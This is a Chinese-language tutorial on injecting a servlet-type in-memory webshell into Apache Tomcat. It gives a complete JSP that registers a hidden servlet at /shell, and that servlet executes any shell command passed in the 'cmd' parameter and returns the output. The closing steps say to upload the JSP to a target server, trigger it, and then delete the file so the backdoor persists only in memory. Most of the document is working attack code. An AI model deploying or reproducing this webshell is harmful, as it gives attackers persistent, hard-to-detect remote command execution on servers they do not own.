在JavaWeb中，webxml文件注册servlet，本质是在ContextConfig内中configureContext()方法类加载的。
我们可以在jsp实现这个过程，JavaWeb支持jsp，此注入方式最方便。


## **流程**
自己调试要引入tomcat-catalina库。
1、创建恶意Servlet类
2、获取context：StandardContxt(通过反射）
3、从context获取Wrapper对象
4、将自己的Servlet封装进wrapper对象
5、将wrapper添加到上下文并设置映射路径



## **代码**
哥斯拉的内存马为servlet型。
jsp
```
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.PrintWriter" %>

<%
    // 创建恶意Servlet
    Servlet servlet = new Servlet() {
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {

        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String cmd = servletRequest.getParameter("cmd");
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = servletResponse.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {

        }
    };

    %>
<%
    // 获取StandardContext
    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();

    // 用Wrapper对其进行封装
    org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();
    newWrapper.setName("jweny");
    newWrapper.setLoadOnStartup(1);
    newWrapper.setServlet(servlet);
    newWrapper.setServletClass(servlet.getClass().getName());

    // 添加封装后的恶意Wrapper到StandardContext的children当中
    standardCtx.addChild(newWrapper);

    // 添加ServletMapping将访问的URL和Servlet进行绑定
    standardCtx.addServletMapping("/shell","jweny");
%>
```
触发：
1. 上传jsp木马至目标服务器
2. 访问上传的jsp
3. 访问定义的恶意servlet映射路径，演示的是/shell或/memshell
4. （可选）删除.jsp文件，内存马还在

‍

